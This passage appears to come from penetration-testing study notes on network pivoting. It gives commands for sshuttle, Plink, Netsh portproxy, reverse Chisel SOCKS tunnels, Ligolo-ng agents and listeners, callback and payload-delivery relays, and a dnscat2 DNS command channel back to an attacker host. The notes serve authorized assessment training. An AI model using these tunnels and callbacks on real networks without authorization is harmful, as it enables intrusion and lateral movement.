**Verify:** Verify destination application and resolver behavior through the intended path. > **If it fails:** Proxy interception is not universal. Use native proxy support, an SSH jump for SSH, or routed tunneling when the protocol requires it.
Find: Route a selected subnet through sshuttle Identify several internal TCP destinations, existing SSH access and whether the local/remote privilege/runtime requirements can be met. ```bash ssh -v USER@PIVOT python3 --version ip route ``` > **Recognize:** An SSH carrier and compatible endpoints make a transparent selected-subnet route a candidate; local Python output alone does not prove the remote runtime. > **Validate next:** Verify local route/firewall permissions, remote runtime, supported transport/mode and explicitly selected subnet/DNS behavior. [Route a selected subnet through sshuttle](../notes/methods/pivoting.md#sshuttle-route).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Working SSH/Python environment, local routing/firewall privileges and explicitly selected supported traffic/subnets ```bash sudo sshuttle --dns \ -r SSH_USER@PIVOT:SSH_PORT \ INTERNAL_SUBNET ANOTHER_SUBNET ``` Through a previously established local forward to the SSH pivot: ```bash sudo sshuttle --dns \ -r SSH_USER@127.0.0.1:LOCAL_SSH_PORT \ INTERNAL_SUBNET ``` > sshuttle is useful when many TCP clients need transparent access. It requires privileges and firewall/redirection support on the client; the remote side needs a compatible Python execution path. It is not a general layer-2 VPN and does not make arbitrary raw-packet or UDP behavior equivalent to direct routing. Record the selected subnets so existing VPN routes are not accidentally captured. > **Verify:** Verify the actual application path and ensure only assigned subnets are selected. > **If it fails:** Missing local privilege, remote runtime or unsupported traffic can break this option. Use fixed forwards/SOCKS or a compatible routed tunnel.
Find: Forward from Windows with OpenSSH, Plink or Netsh From a Windows pivot inspect native/available tunnel utilities, its route to the destination and the rights needed by the selected implementation. ```powershell Get-Command ssh,plink,netsh -ErrorAction SilentlyContinue Get-Service iphlpsvc Test-NetConnection TARGET -Port PORT ``` > **Recognize:** Windows has a carrier/destination candidate; Netsh administrative state and user-space SSH requirements differ. > **Validate next:** Choose the supported tool, verify listener/bind/firewall and correct connection direction; check its exact rights. [Forward from Windows with OpenSSH, Plink or Netsh](../notes/methods/pivoting.md#windows-forward).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Compatible OpenSSH/Plink authentication or administrative Netsh/IP Helper context; correct listener and destination paths ##### 8.1 Built-in OpenSSH client ```cmd where ssh.exe ssh.exe -V ssh.exe -N -R 127.0.0.1:1080 KALI_USER@LHOST -p KALI_SSH_PORT -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 ``` The same `-L`, `-D`, `-R`, `ProxyJump` and `ProxyCommand` concepts apply to current Windows OpenSSH. Remote dynamic forwarding depends on the client version. ##### 8.2 Plink Remote fixed forward from Windows to Kali: ```cmd plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^ -l KALI_USER -pwfile C:\PATH\kali-password.txt ^ -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT ^ -P KALI_SSH_PORT LHOST ``` Local dynamic SOCKS on Windows: ```cmd plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^ -l SSH_USER -pwfile C:\PATH\ssh-password.txt ^ -D 127.0.0.1:1080 -P SSH_PORT PIVOT ``` > Current Plink supports `-L`, `-R` and `-D`, but not OpenSSH's remote-dynamic shorthand. `-batch` prevents an unseen prompt from hanging; pair it with a verified `-hostkey`. `-pwfile` avoids a literal password in the command line but creates a sensitive file that must be protected and removed. Prefer a key or existing authenticated context where feasible. ##### 8.3 Netsh portproxy Elevated Windows shell: ```cmd netsh interface portproxy add v4tov4 ^ listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT ^ connectaddress=INTERNAL_HOST connectport=INTERNAL_PORT netsh interface portproxy show all netstat -ano -p tcp | findstr ":LOCAL_PORT" ``` If the existing firewall policy does not already allow the listener and a change is authorized: ```cmd netsh advfirewall firewall add rule name="OSCP Pivot LOCAL_PORT" ^ dir=in action=allow protocol=TCP localport=LOCAL_PORT ``` Cleanup: ```cmd netsh interface portproxy delete v4tov4 ^ listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT netsh advfirewall firewall delete rule name="OSCP Pivot LOCAL_PORT" ``` > `portproxy` requires an elevated token, forwards TCP rather than UDP, modifies persistent host configuration and may depend on the IP Helper service. A stored rule or listening socket still does not prove the destination is reachable. Record and remove both the proxy and any firewall rule. > **Verify:** Verify actual listener, route and application, then remove created portproxy/firewall state as appropriate. > **If it fails:** Missing admin rights blocks Netsh changes without disproving a user-space SSH route; firewall/bind failures are independent.
Find: Use a reverse Chisel SOCKS or fixed TCP tunnel Map an outbound pivot-to-server HTTP/WebSocket path and identify whether the assessment side needs a fixed listener or SOCKS access. ```bash chisel --version chisel server --help chisel client --help ``` > **Recognize:** The outbound carrier and server-side listener requirement identify a reverse-tunnel topology. > **Validate next:** Verify server reverse mode, fingerprint, carrier upgrade, listener bind and pivot-to-destination compatibility. [Use a reverse Chisel SOCKS or fixed TCP tunnel](../notes/methods/pivoting.md#chisel-reverse).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Compatible reviewed client/server, server reverse mode, reachable server port and pivot-to-destination access On Kali: ```bash chisel server --reverse --port CHISEL_PORT ``` Record the server fingerprint. On the pivot: ```bash chisel client --fingerprint 'SERVER_FINGERPRINT' \ LHOST:CHISEL_PORT R:127.0.0.1:1080:socks ``` `R:socks` is the shorter equivalent using the default server-side `127.0.0.1:1080` listener. Traffic sent to Kali's SOCKS listener exits through the Chisel client/pivot. ```bash # Kali chisel server --reverse --port CHISEL_PORT # Pivot: expose an internal service on Kali loopback chisel client --fingerprint 'SERVER_FINGERPRINT' LHOST:CHISEL_PORT \ R:127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT ``` ```bash chisel --version chisel server --help chisel client --help ss -lntp ``` | Cue | Interpretation | | --- | --- | | No connection at server | Pivot egress, address, listener or WebSocket/proxy path | | HTTP reaches server but upgrade fails | Intermediary may block WebSocket upgrade | | `exec format error` | Wrong OS/architecture | | Missing GLIBC/version symbol | Build/runtime incompatibility; choose a compatible official build | | Fingerprint mismatch | Wrong server or changed key; do not bypass verification blindly | | SOCKS listener exists but endpoint fails | Pivot-to-destination or application/proxy compatibility | | TCP works but UDP fails | Ordinary `socks`, old peer, UDP bind/firewall or unsupported client | > **Verify:** Verify tunnel establishment and end-to-end application behavior; a connected carrier alone is insufficient. > **If it fails:** WebSocket/proxy filtering, reverse mode, listener collision and destination denial are different failures.
Find: Use forward Chisel SOCKS and version-supported UDP routing Identify which side can reach a tunnel server, then inspect the exact peer version and whether TCP or SOCKS5 UDP ASSOCIATE is required. ```bash chisel --version chisel client --help ``` > **Recognize:** Forward placement and actual client transport determine the mode; a UDP-capable tunnel binary does not make every wrapper UDP-capable. > **Validate next:** Verify compatible peers, server SOCKS setting, listener route and the real application's UDP/TCP support. [Use forward Chisel SOCKS and version-supported UDP routing](../notes/methods/pivoting.md#chisel-forward).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Compatible client/server roles, reachable carrier, correctly placed SOCKS listener and explicitly supported UDP-aware mode when required ```bash # Pivot/server side chisel server --socks5 --port CHISEL_PORT # Kali/client side chisel client --fingerprint 'SERVER_FINGERPRINT' PIVOT:CHISEL_PORT \ 127.0.0.1:1080:socks ``` Current upstream Chisel distinguishes: ```text socks / R:socks -> SOCKS5 TCP CONNECT only udpsocks / R:udpsocks -> TCP CONNECT plus SOCKS5 UDP ASSOCIATE ``` ```bash # Requires compatible current peers chisel client --fingerprint 'SERVER_FINGERPRINT' \ LHOST:CHISEL_PORT R:127.0.0.1:1080:udpsocks ``` > This does not make ProxyChains UDP-capable—ProxyChains remains TCP-only. The UDP application must support SOCKS5 UDP ASSOCIATE, or another compatible adapter must be used. Current Chisel peers, TCP and UDP firewall access to the SOCKS listener, and its documented association/fragmentation limits all matter. > **Verify:** Verify the actual required transport end to end, with correct listener/exit placement. > **If it fails:** Version syntax, client compatibility and UDP destination reachability must all hold. Retain the known-working TCP path.
Find: Route a selected internal subnet through Ligolo-ng Use the pivot's route/interface evidence and the intended application's transport needs to decide whether a routed interface is appropriate. ```bash ip route ip link ./proxy -h ``` > **Recognize:** A selected internal network and proxy-incompatible client suggest a route-style agent, subject to its own transport behavior. > **Validate next:** Verify compatible proxy/agent, local privileges, carrier, selected route/interface, DNS and any separate reverse listener. [Route a selected internal subnet through Ligolo-ng](../notes/methods/pivoting.md#ligolo-route).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Compatible proxy/agent, permitted local interface/route management, reachable carrier and selected assigned subnet ##### 10.1 Proxy and agent On Kali: ```bash ./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT ``` In the proxy console, obtain the fingerprint: ```text certificate_fingerprint ``` On the pivot: ```bash ./agent -connect LHOST:LIGOLO_PORT -accept-fingerprint CERT_FINGERPRINT ``` `-ignore-cert` is a controlled-lab/debug fallback, not the baseline. ##### 10.2 Current managed interface and route In the Ligolo console: ```text interface_create --name ligolo session ifconfig interface_add_route --name ligolo --route INTERNAL_SUBNET tunnel_start --tun ligolo ``` Manual Linux alternative: ```bash sudo ip tuntap add user "$USER" mode tun ligolo sudo ip link set ligolo up sudo ip route add INTERNAL_SUBNET dev ligolo ``` Then use normal clients: ```bash ip route get INTERNAL_HOST nmap -sT -Pn -n -p PORTS INTERNAL_HOST curl -v http://INTERNAL_HOST:PORT/ ``` > Ligolo translates connections through a userland network stack. Ordinary TCP clients generally work without ProxyChains, but raw-packet assumptions, ICMP details and some UDP behavior can differ from direct access. Use connect-based validation first. ##### 10.3 Pivot loopback services Ligolo maps its special `240.0.0.0/4` range to the selected agent's loopback. Add one narrow route: ```bash sudo ip route add 240.0.0.1/32 dev ligolo nmap -sT -Pn -n -p PORTS 240.0.0.1 ``` Use this only when the desired service is bound to `127.0.0.1` on the agent. ##### 10.4 Callback or file-server listener on the agent In the selected Ligolo session: ```text listener_add --addr 0.0.0.0:PIVOT_PORT --to 127.0.0.1:KALI_PORT --tcp listener_list ``` Kali listener: ```bash ncat -lvn 127.0.0.1 KALI_PORT ``` An internal target connects to `PIVOT_REACHABLE_IP:PIVOT_PORT`; Ligolo relays it to Kali's loopback listener. Cleanup: ```text listener_stop LISTENER_ID ``` > **Verify:** Verify route/interface ownership, destination application and each necessary reverse listener. > **If it fails:** Overlapping routes, wrong session/interface or absent privilege can create a misleading connected agent without a working path.
Find: Preserve DNS, Kerberos names and time across a pivot Compare name resolution, ticket server principals, clock and the KDC path when an IP service works but named authentication fails. ```bash getent hosts TARGET_HOST klist date -u ``` > **Recognize:** The route and credential may be valid while name/SPN context is wrong. > **Validate next:** Check intended DNS source/result, realm/service name, time and KDC/service routes separately. [Preserve DNS, Kerberos names and time across a pivot](../notes/methods/pivoting.md#pivot-dns).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time - Decide whether the application resolves the name locally, ProxyChains intercepts it, the SOCKS exit resolves it, or the pivot's configured resolver handles it. - Use numeric addresses for route validation; then restore the confirmed hostname when the application protocol requires it. - Kerberos needs an SPN-compatible hostname, realm/KDC route and correct time. A working IP connection does not prove Kerberos naming works. - A temporary host mapping is acceptable only for a confirmed in-scope address/name pair and must be recorded. ```bash getent hosts INTERNAL_FQDN curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_FQDN:PORT/ klist KRB5_TRACE=/dev/stderr kvno cifs/TARGET_HOST ``` The first command checks Kali's normal resolver. The `curl` form deliberately delegates the destination hostname through SOCKS. Do not assume a generic resolver utility will be intercepted by ProxyChains: NSS implementation and process behavior vary. For Impacket, preserve the target hostname while routing to an IP when the tool supports it: ```bash impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP \ 'DOMAIN/USER@TARGET_HOST' ``` > **Verify:** Verify resolved destination, ticket/server principal and actual authenticated application action. > **If it fails:** Do not downgrade the identity claim because transport works. DNS, time, KDC access and service authorization are independent checks.
Find: Build the callback and delivery routes separately from the attack route After the attack path works, draw a new path for target-initiated callbacks/downloads and inspect the listener actually advertised to that target. ```bash ss -lnt ip route get TARGET ``` > **Recognize:** A working initiating proxy path does not route a target's new connection back to that private interface. > **Validate next:** Check the target's route, listener bind, chosen reverse forward/agent listener and final handler. [Build the callback and delivery routes separately from the attack route](../notes/methods/pivoting.md#pivot-callback).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward A forward path and callback path are different graphs: ```text Kali -> tunnel -> internal service # access path internal target -> pivot -> Kali listener # callback path ``` Options: 1. make the callback directly to an address the internal host already reaches; 2. expose a listener on the pivot and relay it to Kali; 3. use a Ligolo agent listener or SSH/Chisel remote forward; 4. choose a non-callback technique such as authenticated remote execution. Fixed SSH callback relay, run from the pivot: ```bash ssh -N -g -L 0.0.0.0:PIVOT_PORT:127.0.0.1:KALI_PORT \ KALI_USER@LHOST -o ExitOnForwardFailure=yes ``` This creates the listener on the SSH client/pivot and makes the destination connection from Kali's SSH server to Kali loopback. `-g` permits other hosts to use the pivot-side local forward. Verify the actual bind with `ss`; do not infer it from command syntax. Also route payload delivery separately. An internal host may reach the pivot but not Kali's HTTP server; relay the delivery service or serve from the pivot when justified. > **Verify:** Verify the target-initiated connection from its source context and the final session or downloaded bytes. > **If it fails:** Wrong advertised interface, loopback bind or missing reverse forward breaks the return leg while leaving the initial attack functional.
Find: Compose multiple pivots and validate every connection leg Start from the last verified first-hop state, inspect the next foothold's routes and assign each new listener/carrier a source and destination. ```bash hostname ip route ss -lnt ``` > **Recognize:** The break lies beyond a known working leg; a connected second carrier is not a complete final route. > **Validate next:** Test each listener-to-destination leg, names and return traffic independently from the correct source. [Compose multiple pivots and validate every connection leg](../notes/methods/pivoting.md#pivot-multihop).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. A working first route, explicit second carrier/listener directions and correct per-hop DNS/return paths For every additional hop, write another complete segment: ```text Kali -> tunnel A -> PIVOT_A -> tunnel B -> PIVOT_B -> INTERNAL_HOST:PORT ``` Rules: - validate one hop before adding the next; - avoid overlapping local/VPN/internal routes; - use unique listener and SOCKS ports; - record which session owns each route; - ensure the deeper agent/client can reach the upstream listener; - re-evaluate DNS and callback direction at every hop; - prefer a routed method for several deep services instead of stacking many opaque wrappers. An upstream tunnel failure invalidates every deeper observation. Do not troubleshoot target credentials until the complete path is restored. > **Verify:** Validate each hop with an application-aware test before chaining the final client. > **If it fails:** Avoid rebuilding every tunnel after one failure. Isolate the first broken leg and preserve working state.
Find: Conditional: tunnel through controlled DNS infrastructure Use known carrier restrictions and an explicitly approved controlled domain to inspect delegation and DNS reachability. ```bash dig DOMAIN NS ``` > **Recognize:** Delegation is an infrastructure prerequisite; an NS record alone does not prove ownership or an operational tunnel. > **Validate next:** Confirm authorized control, resolver path, compatible client/server/runtime and supported intended operation. [Conditional: tunnel through controlled DNS infrastructure](../notes/methods/pivoting.md#pivot-dns-tunnel).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Controlled/delegated domain or supported direct setup, reachable DNS path, compatible server/client and allowed execution Use only when ordinary transports are unavailable and DNS is demonstrably permitted. This is a conditional advanced route, but it remains in the current official BOK. Prerequisites: - command execution sufficient to run a compatible client; - either authoritative control/NS delegation for `TUNNEL_DOMAIN` or direct UDP/53 reachability to the server; - a resolver chain that forwards the chosen domain externally; - permission to bind/listen on the required DNS port; - tolerance for low throughput and conspicuous DNS patterns. Authoritative-domain mode: ```bash dnscat2-server --secret=SHARED_SECRET TUNNEL_DOMAIN ``` Client: ```bash ./dnscat --secret=SHARED_SECRET TUNNEL_DOMAIN ``` Direct DNS-server mode shown by the server's own usage output: ```bash ./dnscat --dns server=DNS_SERVER,port=53 --secret=SHARED_SECRET ``` Server console: ```text windows window -i SESSION_ID help ``` > A DNS query reaching the server proves only the resolver path. Match the pre-shared secret or independently verify the negotiated authentication string. Cache, recursion, EDNS, TCP fallback, DNS security controls and response-size limits can affect the channel. DNS tunneling is not DNS spoofing; spoofing remains prohibited by the current exam guide. > **Verify:** Verify the actual carrier and intended forwarded action; retain delegation and connectivity prerequisites. > **If it fails:** No delegation, resolver interference, egress policy or missing runtime can block the route. Keep this a conditional fallback.
